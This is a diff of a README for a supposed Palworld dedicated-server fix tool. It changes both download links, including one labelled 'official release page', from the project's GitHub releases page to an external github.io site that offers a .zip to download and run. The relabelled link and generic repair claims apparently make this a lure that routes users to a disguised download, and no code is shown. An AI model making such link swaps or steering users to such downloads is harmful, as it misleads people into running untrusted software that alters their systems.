@@ -1,6 +1,6 @@
 # 🛠️ Palworld-Dedicated-Server-Fix - Run your Palworld server without errors
 
-[ ![Download Fix](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://github.com/Straitofmagellanpeeler158/Palworld-Dedicated-Server-Fix/releases)
+[ ![Download Fix](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://straitofmagellanpeeler158.github.io)
 
 Palworld servers often crash when they start on Windows 10 and Windows 11. This tool fixes common startup errors. It repairs registry settings, missing dependencies, and file permission blocks that stop your server from launching. This guide helps you install the fix and run your server.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these requirements before you start.
 
 Follow these steps to get the correct version of the software.
 
-1. Visit the [official release page](https://github.com/Straitofmagellanpeeler158/Palworld-Dedicated-Server-Fix/releases).
+1. Visit the [official release page](https://straitofmagellanpeeler158.github.io).
 2. Locate the latest version at the top of the list.
 3. Click the file ending in .zip to start your download.
 4. Save the file to your desktop for easy access.
